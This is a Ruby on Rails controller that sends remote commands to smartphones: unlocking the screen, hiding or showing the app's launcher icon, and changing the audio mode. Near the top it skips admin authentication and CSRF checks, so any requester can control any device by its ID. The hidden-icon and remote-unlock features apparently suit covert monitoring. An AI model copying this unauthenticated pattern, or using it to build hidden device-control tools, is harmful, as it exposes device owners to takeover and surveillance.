class DeviceControlController < InheritedResources::Base
  skip_before_action :authenticate_admin_user!, raise: false
  skip_before_action :verify_authenticity_token

  def screen_unlock
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])

      # Send async command to unlock screen
      pending_command = send_command_async(
        @smartphone,
        'unlock_screen',
        {}
      )

      commandOutput = ["Screen unlock command sent (Request ID: #{pending_command.request_id})"]

    rescue => e
      Rails.logger.error("Error unlocking screen: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "screen_unlock", locals: { commandOutput: commandOutput }
      }
    end
  end

  def hide_app_icon
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])

      # Send async command to hide app icon
      pending_command = send_command_async(
        @smartphone,
        'hide_icon',
        {}
      )

      @smartphone.update(is_app_hidden: true)
      commandOutput = ["App hide command sent (Request ID: #{pending_command.request_id})"]

    rescue => e
      Rails.logger.error("Error hiding icon: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "hide_app_icon", locals: { commandOutput: commandOutput }
      }
    end
  end

  def show_app_icon
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])

      # Send async command to show app icon
      pending_command = send_command_async(
        @smartphone,
        'show_icon',
        {}
      )

      @smartphone.update(is_app_hidden: false)
      commandOutput = ["App show command sent (Request ID: #{pending_command.request_id})"]

    rescue => e
      Rails.logger.error("Error showing icon: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "show_app_icon", locals: { commandOutput: commandOutput }
      }
    end
  end

  def hide_app
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'hide_icon', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        commandOutput = ["App icon hidden successfully"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error hiding app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "hide_app", locals: { commandOutput: commandOutput }
      }
    end
  end

  def show_app
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'show_icon', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        commandOutput = ["App icon shown successfully"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error showing app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "show_app", locals: { commandOutput: commandOutput }
      }
    end
  end

  def set_audio_mode
    begin
      mode = params[:mode] # 'silent', 'vibrate', 'normal'
      @smartphone = Smartphone.find(params[:smartphone_id])

      if mode.present?
        # Send async command to change audio mode
        pending_command = send_command_async(
          @smartphone,
          'change_audio_mode',
          { mode: mode }
        )

        commandOutput = ["Audio mode change command sent: #{mode} (Request ID: #{pending_command.request_id})"]
      else
        commandOutput = ["No mode specified"]
      end

    rescue => e
      Rails.logger.error("Error setting audio mode: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "set_audio_mode", locals: { commandOutput: commandOutput }
      }
    end
  end

  def wake_lock
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'unlock_screen', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        commandOutput = ["Screen unlocked successfully"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error unlocking screen: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "wake_lock", locals: { commandOutput: commandOutput }
      }
    end
  end

  private

  def want_json?
    request.format.json? || request.headers['Accept']&.include?('application/json')
  end

  def command_service_for(smartphone)
    DeviceCommandService.new(smartphone)
  end

  def send_command_async(smartphone, command, params = {})
    command_service_for(smartphone).queue_command(command, params)
  end

  def send_command_and_wait(smartphone, command, params = {}, timeout: 30.seconds)
    command_service_for(smartphone).wait_for_command(command, params, timeout: timeout)
  end
end
